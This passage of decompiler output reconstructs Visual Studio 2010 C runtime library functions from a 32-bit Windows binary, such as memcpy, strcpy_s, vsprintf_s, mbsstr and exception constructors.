{
  *param_1 = (undefined *)std::exception::vftable;
  std::exception::_Tidy((exception *)param_1);
  return;
}



undefined ** __fastcall FUN_003b0a93(undefined **param_1,undefined param_2,undefined param_3)

{
  std::exception::exception((exception *)param_1,(char **)&param_3);
  *param_1 = (undefined *)std::bad_cast::vftable;
  return param_1;
}



undefined ** __thiscall FUN_003b0ab1(void *this,byte param_1)

{
  *(undefined ***)this = std::exception::vftable;
  std::exception::_Tidy((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = vftable;
  this[8] = (exception)0x0;
  operator_(this,param_1);
  return this;
}



undefined ** __thiscall FUN_003b0afd(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_cast::vftable;
  return (undefined **)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  void *pvVar16;
  uint uVar17;
  uint uVar18;
  undefined4 *puVar19;
  undefined4 *puVar20;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar20 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar19 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar19 & 3) == 0) {
      uVar18 = _Size >> 2;
      if (uVar18 < 8) goto LAB_003b0d08;
      for (; uVar18 != 0; uVar18 = uVar18 - 1) {
        *puVar19 = *puVar20;
        puVar20 = puVar20 + -1;
        puVar19 = puVar19 + -1;
      }
      switch(_Size & 3) {
      case 1:
        goto switchD_003b0d2c_caseD_1;
      case 2:
        goto switchD_003b0d2c_caseD_2;
      case 3:
        goto switchD_003b0d2c_caseD_3;
      }
    }
    else {
      switch(_Size) {
      case 0:
        break;
      case 1:
switchD_003b0d2c_caseD_1:
        *(undefined *)((int)puVar19 + 3) = *(undefined *)((int)puVar20 + 3);
        return _Dst;
      case 2:
switchD_003b0d2c_caseD_2:
        *(undefined *)((int)puVar19 + 3) = *(undefined *)((int)puVar20 + 3);
        *(undefined *)((int)puVar19 + 2) = *(undefined *)((int)puVar20 + 2);
        return _Dst;
      case 3:
switchD_003b0d2c_caseD_3:
        *(undefined *)((int)puVar19 + 3) = *(undefined *)((int)puVar20 + 3);
        *(undefined *)((int)puVar19 + 2) = *(undefined *)((int)puVar20 + 2);
        *(undefined *)((int)puVar19 + 1) = *(undefined *)((int)puVar20 + 1);
        return _Dst;
      default:
        uVar17 = _Size - ((uint)puVar19 & 3);
        switch((uint)puVar19 & 3) {
        case 1:
          *(undefined *)((int)puVar19 + 3) = *(undefined *)((int)puVar20 + 3);
          puVar20 = (undefined4 *)((int)puVar20 + -1);
          uVar18 = uVar17 >> 2;
          puVar19 = (undefined4 *)((int)puVar19 - 1);
          if (uVar18 < 8) {
LAB_003b0d08:
                    // WARNING: Could not recover jumptable at 0x003b0d0a. Too many branches
                    // WARNING: Treating indirect jump as call
            pvVar16 = (void *)(*(code *)(&PTR_LAB_003b0ddc)[-uVar18])();
            return pvVar16;
          }
          for (; uVar18 != 0; uVar18 = uVar18 - 1) {
            *puVar19 = *puVar20;
            puVar20 = puVar20 + -1;
            puVar19 = puVar19 + -1;
          }
          switch(uVar17 & 3) {
          case 1:
            goto switchD_003b0d2c_caseD_1;
          case 2:
            goto switchD_003b0d2c_caseD_2;
          case 3:
            goto switchD_003b0d2c_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar19 + 3) = *(undefined *)((int)puVar20 + 3);
          uVar18 = uVar17 >> 2;
          *(undefined *)((int)puVar19 + 2) = *(undefined *)((int)puVar20 + 2);
          puVar20 = (undefined4 *)((int)puVar20 + -2);
          puVar19 = (undefined4 *)((int)puVar19 - 2);
          if (uVar18 < 8) goto LAB_003b0d08;
          for (; uVar18 != 0; uVar18 = uVar18 - 1) {
            *puVar19 = *puVar20;
            puVar20 = puVar20 + -1;
            puVar19 = puVar19 + -1;
          }
          switch(uVar17 & 3) {
          case 1:
            goto switchD_003b0d2c_caseD_1;
          case 2:
            goto switchD_003b0d2c_caseD_2;
          case 3:
            goto switchD_003b0d2c_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar19 + 3) = *(undefined *)((int)puVar20 + 3);
          *(undefined *)((int)puVar19 + 2) = *(undefined *)((int)puVar20 + 2);
          uVar18 = uVar17 >> 2;
          *(undefined *)((int)puVar19 + 1) = *(undefined *)((int)puVar20 + 1);
          puVar20 = (undefined4 *)((int)puVar20 + -3);
          puVar19 = (undefined4 *)((int)puVar19 - 3);
          if (uVar18 < 8) goto LAB_003b0d08;
          for (; uVar18 != 0; uVar18 = uVar18 - 1) {
            *puVar19 = *puVar20;
            puVar20 = puVar20 + -1;
            puVar19 = puVar19 + -1;
          }
          switch(uVar17 & 3) {
          case 1:
            goto switchD_003b0d2c_caseD_1;
          case 2:
            goto switchD_003b0d2c_caseD_2;
          case 3:
            goto switchD_003b0d2c_caseD_3;
          }
        }
      }
    }
    return _Dst;
  }
  if (((0x7f < _Size) && (_DAT_003ea174 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar20 = (undefined4 *)_Dst;
    if (((uint)_Src & 0xf) != 0) {
      uVar18 = 0x10 - ((uint)_Src & 0xf);
      _Size = _Size - uVar18;
      for (uVar17 = uVar18 & 3; uVar17 != 0; uVar17 = uVar17 - 1) {
                    // WARNING: Load size is inaccurate
        *(undefined *)puVar20 = *_Src;
        _Src = (void *)((int)_Src + 1);
        puVar20 = (undefined4 *)((int)puVar20 + 1);
      }
      for (uVar18 = uVar18 >> 2; uVar18 != 0; uVar18 = uVar18 - 1) {
                    // WARNING: Load size is inaccurate
        *puVar20 = *_Src;
        _Src = (void *)((int)_Src + 4);
        puVar20 = puVar20 + 1;
      }
    }
    for (uVar17 = _Size >> 7; uVar17 != 0; uVar17 = uVar17 - 1) {
                    // WARNING: Load size is inaccurate
      uVar1 = *(undefined4 *)((int)_Src + 4);
      uVar2 = *(undefined4 *)((int)_Src + 8);
      uVar3 = *(undefined4 *)((int)_Src + 0xc);
      uVar4 = *(undefined4 *)((int)_Src + 0x10);
      uVar5 = *(undefined4 *)((int)_Src + 0x14);
      uVar6 = *(undefined4 *)((int)_Src + 0x18);
      uVar7 = *(undefined4 *)((int)_Src + 0x1c);
      uVar8 = *(undefined4 *)((int)_Src + 0x20);
      uVar9 = *(undefined4 *)((int)_Src + 0x24);
      uVar10 = *(undefined4 *)((int)_Src + 0x28);
      uVar11 = *(undefined4 *)((int)_Src + 0x2c);
      uVar12 = *(undefined4 *)((int)_Src + 0x30);
      uVar13 = *(undefined4 *)((int)_Src + 0x34);
      uVar14 = *(undefined4 *)((int)_Src + 0x38);
      uVar15 = *(undefined4 *)((int)_Src + 0x3c);
      *puVar20 = *_Src;
      puVar20[1] = uVar1;
      puVar20[2] = uVar2;
      puVar20[3] = uVar3;
      puVar20[4] = uVar4;
      puVar20[5] = uVar5;
      puVar20[6] = uVar6;
      puVar20[7] = uVar7;
      puVar20[8] = uVar8;
      puVar20[9] = uVar9;
      puVar20[10] = uVar10;
      puVar20[0xb] = uVar11;
      puVar20[0xc] = uVar12;
      puVar20[0xd] = uVar13;
      puVar20[0xe] = uVar14;
      puVar20[0xf] = uVar15;
      uVar1 = *(undefined4 *)((int)_Src + 0x44);
      uVar2 = *(undefined4 *)((int)_Src + 0x48);
      uVar3 = *(undefined4 *)((int)_Src + 0x4c);
      uVar4 = *(undefined4 *)((int)_Src + 0x50);
      uVar5 = *(undefined4 *)((int)_Src + 0x54);
      uVar6 = *(undefined4 *)((int)_Src + 0x58);
      uVar7 = *(undefined4 *)((int)_Src + 0x5c);
      uVar8 = *(undefined4 *)((int)_Src + 0x60);
      uVar9 = *(undefined4 *)((int)_Src + 100);
      uVar10 = *(undefined4 *)((int)_Src + 0x68);
      uVar11 = *(undefined4 *)((int)_Src + 0x6c);
      uVar12 = *(undefined4 *)((int)_Src + 0x70);
      uVar13 = *(undefined4 *)((int)_Src + 0x74);
      uVar14 = *(undefined4 *)((int)_Src + 0x78);
      uVar15 = *(undefined4 *)((int)_Src + 0x7c);
      puVar20[0x10] = *(undefined4 *)((int)_Src + 0x40);
      puVar20[0x11] = uVar1;
      puVar20[0x12] = uVar2;
      puVar20[0x13] = uVar3;
      puVar20[0x14] = uVar4;
      puVar20[0x15] = uVar5;
      puVar20[0x16] = uVar6;
      puVar20[0x17] = uVar7;
      puVar20[0x18] = uVar8;
      puVar20[0x19] = uVar9;
      puVar20[0x1a] = uVar10;
      puVar20[0x1b] = uVar11;
      puVar20[0x1c] = uVar12;
      puVar20[0x1d] = uVar13;
      puVar20[0x1e] = uVar14;
      puVar20[0x1f] = uVar15;
      _Src = (void *)((int)_Src + 0x80);
      puVar20 = puVar20 + 0x20;
    }
    if ((_Size & 0x7f) != 0) {
      for (uVar17 = (_Size & 0x7f) >> 4; uVar17 != 0; uVar17 = uVar17 - 1) {
                    // WARNING: Load size is inaccurate
        uVar1 = *(undefined4 *)((int)_Src + 4);
        uVar2 = *(undefined4 *)((int)_Src + 8);
        uVar3 = *(undefined4 *)((int)_Src + 0xc);
        *puVar20 = *_Src;
        puVar20[1] = uVar1;
        puVar20[2] = uVar2;
        puVar20[3] = uVar3;
        _Src = (void *)((int)_Src + 0x10);
        puVar20 = puVar20 + 4;
      }
      if ((_Size & 0xf) != 0) {
        for (uVar17 = (_Size & 0xf) >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {
                    // WARNING: Load size is inaccurate
          *puVar20 = *_Src;
          _Src = (void *)((int)_Src + 4);
          puVar20 = puVar20 + 1;
        }
        for (uVar17 = _Size & 3; uVar17 != 0; uVar17 = uVar17 - 1) {
                    // WARNING: Load size is inaccurate
          *(undefined *)puVar20 = *_Src;
          _Src = (void *)((int)_Src + 1);
          puVar20 = (undefined4 *)((int)puVar20 + 1);
        }
      }
    }
    return _Dst;
  }
  puVar20 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar18 = _Size >> 2;
    if (uVar18 < 8) goto LAB_003b0ba0;
                    // WARNING: Load size is inaccurate
    for (; uVar18 != 0; uVar18 = uVar18 - 1) {
      *puVar20 = *_Src;
      _Src = (undefined4 *)((int)_Src + 4);
      puVar20 = puVar20 + 1;
    }
    switch(_Size & 3) {
    case 1:
      goto switchD_003b0b98_caseD_1;
    case 2:
      goto switchD_003b0b98_caseD_2;
    case 3:
      goto switchD_003b0b98_caseD_3;
    }
  }
  else {
    switch(_Size) {
    case 0:
      break;
    case 1:
switchD_003b0b98_caseD_1:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar20 = *_Src;
      return _Dst;
    case 2:
switchD_003b0b98_caseD_2:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar20 = *_Src;
      *(undefined *)((int)puVar20 + 1) = *(undefined *)((int)_Src + 1);
      return _Dst;
    case 3:
switchD_003b0b98_caseD_3:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar20 = *_Src;
      *(undefined *)((int)puVar20 + 1) = *(undefined *)((int)_Src + 1);
      *(undefined *)((int)puVar20 + 2) = *(undefined *)((int)_Src + 2);
      return _Dst;
    default:
      uVar17 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar18 = uVar17 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (undefined4 *)((int)_Src + 3);
        puVar20 = (undefined4 *)((int)_Dst + 3);
        if (uVar18 < 8) {
LAB_003b0ba0:
                    // WARNING: Could not recover jumptable at 0x003b0ba0. Too many branches
                    // WARNING: Treating indirect jump as call
          pvVar16 = (void *)(*(code *)(&PTR_LAB_003b0c24)[uVar18])();
          return pvVar16;
        }
                    // WARNING: Load size is inaccurate
        for (; uVar18 != 0; uVar18 = uVar18 - 1) {
          *puVar20 = *_Src;
          _Src = (undefined4 *)((int)_Src + 4);
          puVar20 = puVar20 + 1;
        }
        switch(uVar17 & 3) {
        case 1:
          goto switchD_003b0b98_caseD_1;
        case 2:
          goto switchD_003b0b98_caseD_2;
        case 3:
          goto switchD_003b0b98_caseD_3;
        }
        break;
      case 2:
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar18 = uVar17 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (undefined4 *)((int)_Src + 2);
        puVar20 = (undefined4 *)((int)_Dst + 2);
        if (uVar18 < 8) goto LAB_003b0ba0;
                    // WARNING: Load size is inaccurate
        for (; uVar18 != 0; uVar18 = uVar18 - 1) {
          *puVar20 = *_Src;
          _Src = (undefined4 *)((int)_Src + 4);
          puVar20 = puVar20 + 1;
        }
        switch(uVar17 & 3) {
        case 1:
          goto switchD_003b0b98_caseD_1;
        case 2:
          goto switchD_003b0b98_caseD_2;
        case 3:
          goto switchD_003b0b98_caseD_3;
        }
        break;
      case 3:
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar18 = uVar17 >> 2;
        _Src = (undefined4 *)((int)_Src + 1);
        puVar20 = (undefined4 *)((int)_Dst + 1);
        if (uVar18 < 8) goto LAB_003b0ba0;
                    // WARNING: Load size is inaccurate
        for (; uVar18 != 0; uVar18 = uVar18 - 1) {
          *puVar20 = *_Src;
          _Src = (undefined4 *)((int)_Src + 4);
          puVar20 = puVar20 + 1;
        }
        switch(uVar17 & 3) {
        case 1:
          goto switchD_003b0b98_caseD_1;
        case 2:
          goto switchD_003b0b98_caseD_2;
        case 3:
          goto switchD_003b0b98_caseD_3;
        }
      }
    }
  }
  return _Dst;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  piVar1 = &local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *piVar1 = 0;
    piVar1 = piVar1 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    iVar3 = -1;
  }
  else {
    if ((param_3 == 0) || (param_2 != (char *)0x0)) {
      local_24._cnt = 0x7fffffff;
      if (param_3 < 0x80000000) {
        local_24._cnt = param_3;
      }
      local_24._flag = 0x42;
      local_24._base = param_2;
      local_24._ptr = param_2;
      iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
      if (param_2 != (char *)0x0) {
        if (-1 < iVar3) {
          local_24._cnt = local_24._cnt - 1;
          if (-1 < local_24._cnt) {
            *local_24._ptr = '\0';
            return iVar3;
          }
          iVar2 = __flsbuf(0,&local_24);
          if (iVar2 != -1) {
            return iVar3;
          }
        }
        param_2[param_3 - 1] = '\0';
        iVar3 = (-1 < local_24._cnt) - 2;
      }
    }
    else {
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_003b60f9();
      iVar3 = -1;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    return -1;
  }
  if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
    if (iVar2 < 0) {
      *_DstBuf = '\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_003b60f9();
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2010 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack16;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    if (_Src != (char *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        cVar1 = *_Src;
        _Src[iVar3] = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eStack16 = 0x22;
      *piVar2 = 0x22;
      goto LAB_003b0ffe;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eStack16 = 0x16;
  *piVar2 = 0x16;
LAB_003b0ffe:
  FUN_003b60f9();
  return eStack16;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_003b103e(size_t param_1)

{
  int iVar1;
  void *pvVar2;
  undefined **local_14 [3];
  char *local_8;
  
  do {
    pvVar2 = _malloc(param_1);
    if (pvVar2 != (void *)0x0) {
      return;
    }
    iVar1 = __callnewh(param_1);
  } while (iVar1 != 0);
  if ((_DAT_003d7cdc & 1) == 0) {
    _DAT_003d7cdc = _DAT_003d7cdc | 1;
    local_8 = "bad allocation";
    FUN_003b09a4(&DAT_003d7cd0,&local_8);
    _DAT_003d7cd0 = std::bad_alloc::vftable;
    _atexit(&LAB_003c5561);
  }
  std::exception::exception((exception *)local_14,(exception *)&DAT_003d7cd0);
  local_14[0] = std::bad_alloc::vftable;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(local_14,&DAT_003d3140);
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2010 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_003d6de0) && ((p_Var2->_ownlocale & DAT_003d6b98) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != lpAddend_003d6aa0) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_003d6b98) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  __mbsnbcpy_l
// 
// Library: Visual Studio 2010 Release

uchar * __cdecl __mbsnbcpy_l(uchar *_Dest,uchar *_Source,size_t _Count,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int *piVar3;
  uint iterations;
  undefined (*lorem_ipsum) [16];
  undefined (*pauVar4) [16];
  _LocaleUpdate local_14 [4];
  int local_10;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,_Locale);
  if (((_Dest == (uchar *)0x0) && (_Count != 0)) || ((_Source == (uchar *)0x0 && (_Count != 0)))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_003b60f9();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    _Dest = (uchar *)0x0;
  }
  else {
    lorem_ipsum = (undefined (*) [16])_Dest;
    if (*(int *)(local_10 + 8) == 0) {
      _Dest = (uchar *)_strncpy((char *)_Dest,(char *)_Source,_Count);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
    else {
      do {
        while( true ) {
          pauVar4 = lorem_ipsum;
          if (_Count == 0) goto LAB_003b11f2;
          bVar1 = *_Source;
          iterations = _Count - 1;
          bVar2 = *(byte *)(bVar1 + 0x1d + local_10);
          (*pauVar4)[0] = bVar1;
          if ((bVar2 & 4) == 0) break;
          if (iterations == 0) {
            (*pauVar4)[0] = 0;
            goto LAB_003b11f2;
          }
          bVar1 = _Source[1];
          iterations = _Count - 2;
          (*pauVar4)[1] = bVar1;
          lorem_ipsum = (undefined (*) [16])(*pauVar4 + 2);
          _Source = _Source + 2;
          _Count = iterations;
          if (bVar1 == 0) {
            (*pauVar4)[0] = 0;
            goto LAB_003b11e3;
          }
        }
        lorem_ipsum = (undefined (*) [16])(*pauVar4 + 1);
        _Source = _Source + 1;
        _Count = iterations;
      } while (bVar1 != 0);
LAB_003b11e3:
      if (iterations != 0) {
        trim_string(lorem_ipsum,0,iterations);
      }
LAB_003b11f2:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  __mbsnbcpy
// 
// Library: Visual Studio 2010 Release

uchar * __cdecl __mbsnbcpy(uchar *_Dest,uchar *_Source,size_t _Count)

{
  uchar *puVar1;
  
  puVar1 = __mbsnbcpy_l(_Dest,_Source,_Count,(_locale_t)0x0);
  return puVar1;
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  LPVOID pvVar1;
  int *piVar2;
  int local_8;
  
  local_8 = 0;
  pvVar1 = __calloc_impl(_Count,_Size,&local_8);
  if ((pvVar1 == (LPVOID)0x0) && (local_8 != 0)) {
    piVar2 = __errno();
    if (piVar2 != (int *)0x0) {
      piVar2 = __errno();
      *piVar2 = local_8;
    }
  }
  return pvVar1;
}



// Library Function - Single Match
//  _strcpy
// 
// Library: Visual Studio

char * __cdecl _strcpy(char *_Dest,char *_Source)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  uVar3 = (uint)_Source & 3;
  puVar4 = (uint *)_Dest;
  while (uVar3 != 0) {
    bVar1 = *_Source;
    uVar3 = (uint)bVar1;
    _Source = (char *)((int)_Source + 1);
    if (bVar1 == 0) goto LAB_003b1370;
    *(byte *)puVar4 = bVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    uVar3 = (uint)_Source & 3;
  }
  do {
    uVar2 = *(uint *)_Source;
    uVar3 = *(uint *)_Source;
    _Source = (char *)((int)_Source + 4);
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar3 == '\0') {
LAB_003b1370:
        *(byte *)puVar4 = (byte)uVar3;
        return _Dest;
      }
      if ((char)(uVar3 >> 8) == '\0') {
        *(short *)puVar4 = (short)uVar3;
        return _Dest;
      }
      if ((uVar3 & 0xff0000) == 0) {
        *(short *)puVar4 = (short)uVar3;
        *(byte *)((int)puVar4 + 2) = 0;
        return _Dest;
      }
      if ((uVar3 & 0xff000000) == 0) {
        *puVar4 = uVar3;
        return _Dest;
      }
    }
    *puVar4 = uVar3;
    puVar4 = puVar4 + 1;
  } while( true );
}



// Library Function - Single Match
//  __mbsstr_l
// 
// Library: Visual Studio 2010 Release

uchar * __cdecl __mbsstr_l(uchar *_Str,uchar *_Substr,_locale_t _Locale)

{
  byte bVar1;
  byte *pbVar2;
  int *piVar3;
  size_t sVar4;
  size_t sVar5;
  uchar *puVar6;
  int iVar7;
  int iVar8;
  byte *pbVar9;
  _LocaleUpdate local_14 [4];
  int local_10;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,_Locale);
  if (*(int *)(local_10 + 8) == 0) {
    pbVar2 = (byte *)_strstr((char *)_Str,(char *)_Substr);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return pbVar2;
    }
  }
  else {
    if (_Substr == (uchar *)0x0) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      FUN_003b60f9();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return (byte *)0x0;
    }
    if (*_Substr == '\0') {
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return _Str;
    }
    if (_Str == (uchar *)0x0) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      FUN_003b60f9();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      pbVar2 = (byte *)0x0;
    }
    else {
      sVar4 = _strlen((char *)_Substr);
      sVar5 = _strlen((char *)_Str);
      if (*_Str != '\0') {
        iVar7 = (int)_Str - (int)_Substr;
        pbVar2 = _Str;
        do {
          if (_Str + (sVar5 - sVar4) < pbVar2) break;
          puVar6 = _Substr;
          bVar1 = *pbVar2;
          while (bVar1 != 0) {
            if (*puVar6 == '\0') goto LAB_003b1491;
            if (puVar6[iVar7] != *puVar6) break;
            puVar6 = puVar6 + 1;
            bVar1 = puVar6[iVar7];
          }
          if (*puVar6 == '\0') {
LAB_003b1491:
            if (local_8 == '\0') {
              return pbVar2;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return pbVar2;
          }
          pbVar9 = pbVar2 + 1;
          iVar8 = iVar7 + 1;
          if ((*(byte *)(*pbVar2 + 0x1d + local_10) & 4) != 0) {
            if (*pbVar9 == 0) break;
            pbVar9 = pbVar2 + 2;
            iVar8 = iVar7 + 2;
          }
          iVar7 = iVar8;
          pbVar2 = pbVar9;
        } while (*pbVar9 != 0);
      }
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      pbVar2 = (byte *)0x0;
    }
  }
  return pbVar2;
}



// Library Function - Single Match
//  __mbsstr
// 
// Library: Visual Studio 2010 Release

uchar * __cdecl __mbsstr(uchar *_Str,uchar *_Substr)

{
  uchar *puVar1;
  
  puVar1 = __mbsstr_l(_Str,_Substr,(_locale_t)0x0);
  return puVar1;
}



void FUN_003b14b9(void *param_1)

{
  FUN_003aee4b(param_1);
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Library: Visual Studio 2010 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  ushort uVar1;
  undefined4 uVar2;
  byte bVar3;
  bool bVar4;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar3 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar4 = bVar3 < (byte)*_Str2;
      if (bVar3 != *_Str2) goto LAB_003b1514;
      _Str2 = _Str2 + 1;
      if (bVar3 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_003b14e0;
    }
    uVar1 = *(ushort *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar3 = (byte)uVar1;
    bVar4 = bVar3 < (byte)*_Str2;
    if (bVar3 != *_Str2) goto LAB_003b1514;
    if (bVar3 == 0) {
      return 0;
    }
    bVar3 = (byte)((uint)uVar1 >> 8);
    bVar4 = bVar3 < ((byte *)_Str2)[1];
    if (bVar3 != ((byte *)_Str2)[1]) goto LAB_003b1514;
    if (bVar3 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_003b14e0:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar3 = (byte)uVar2;
    bVar4 = bVar3 < (byte)*_Str2;
    if (bVar3 != *_Str2) break;
    if (bVar3 == 0) {
      return 0;
    }
    bVar3 = (byte)((uint)uVar2 >> 8);
    bVar4 = bVar3 < ((byte *)_Str2)[1];
    if (bVar3 != ((byte *)_Str2)[1]) break;
    if (bVar3 == 0) {
      return 0;
    }
